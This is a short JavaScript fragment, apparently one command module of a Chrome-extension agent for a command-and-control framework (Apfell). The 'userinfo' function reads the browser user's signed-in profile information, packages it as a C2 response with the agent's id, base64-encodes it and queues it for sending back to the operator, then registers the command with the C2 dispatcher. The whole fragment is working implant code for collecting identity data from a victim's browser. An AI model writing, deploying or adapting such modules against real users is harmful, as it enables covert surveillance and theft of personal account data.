userinfo = function(task) {
    chrome.identity.getProfileUserInfo(function(info){
        if (info === undefined) {
            sendError(task['task_id']);
        } else {
            response = {"task_id":task['task_id'], "user_output":JSON.stringify(info, null, 2), "completed": true};
            outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            enc = JSON.stringify(outer_response);
            final = apfell.apfellid + enc;
            msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        }
    });
};

C2.commands[userinfo.name] = userinfo;
COMMAND_ENDS_HERE
